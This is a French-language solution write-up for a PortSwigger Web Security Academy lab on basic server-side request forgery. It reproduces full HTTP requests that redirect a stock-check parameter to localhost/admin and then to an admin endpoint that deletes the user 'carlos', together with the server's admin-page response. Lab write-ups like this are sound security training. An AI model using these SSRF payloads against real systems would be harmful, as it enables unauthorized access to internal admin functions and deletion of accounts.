# Lab

https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost

## Solution

La requête pour obtenir le stock d'un produit est la suivante :

```http
POST /product/stock HTTP/2
Host: 0a5b00830334fa20837c60f50058000d.web-security-academy.net
Cookie: session=MESkTGQw4Zp9hkbH1ko0gEv0n1QOfQui
Content-Length: 107
Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a5b00830334fa20837c60f50058000d.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a5b00830334fa20837c60f50058000d.web-security-academy.net/product?productId=4
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D4%26storeId%3D2
```

On peut modifier le paramètre `stockApi` pour qu'il pointe vers le serveur local :

```http
POST /product/stock HTTP/2
Host: 0a5b00830334fa20837c60f50058000d.web-security-academy.net
Cookie: session=MESkTGQw4Zp9hkbH1ko0gEv0n1QOfQui
Content-Length: 54
Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a5b00830334fa20837c60f50058000d.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a5b00830334fa20837c60f50058000d.web-security-academy.net/product?productId=4
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

stockApi=http://localhost/admin
```

Ce que nous renvoie vers la page d'administration du serveur local :

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
Set-Cookie: session=0zGVrUBvSIf4eOZPP678dSdc33mXzQ7N; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 5872

<!DOCTYPE html>
<html>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/admin">Admin panel</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section>
                        <h1>Users</h1>
                        <div>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
                        </div>
                    </section>
                    <br>
                    <hr>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

Et on peut supprimer l'utilisateur `carlos` pour résoudre le lab :

```http
POST /product/stock HTTP/2
Host: 0a5b00830334fa20837c60f50058000d.web-security-academy.net
Cookie: session=MESkTGQw4Zp9hkbH1ko0gEv0n1QOfQui
Content-Length: 54
Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a5b00830334fa20837c60f50058000d.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a5b00830334fa20837c60f50058000d.web-security-academy.net/product?productId=4
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

stockApi=http://localhost/admin/delete?username=carlos
```